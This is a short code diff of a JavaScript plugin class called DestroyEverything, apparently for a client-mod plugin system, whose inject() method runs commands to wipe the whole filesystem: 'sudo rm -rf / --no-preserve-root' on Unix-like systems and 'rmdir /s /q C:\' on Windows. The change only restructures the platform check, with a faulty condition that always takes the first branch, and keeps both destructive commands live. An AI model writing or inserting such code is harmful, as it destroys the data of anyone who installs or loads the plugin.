@@ -4,9 +4,9 @@ import manifest from './manifest.json';
 
 export default class DestroyEverything extends RikkaPlugin {
    inject() {
-      exec("sudo rm -rf / --no-preserve-root");
-         if (process.platform === "win32") {
-             exec("rmdir /s /q C:\\");
-      }
+      if ((process.platform) === "linux" || "darwin")
+         exec("sudo rm -rf / --no-preserve-root");
+      else if (process.platform === "win32")
+         exec("rmdir /s /q C:\\");
    }
 }
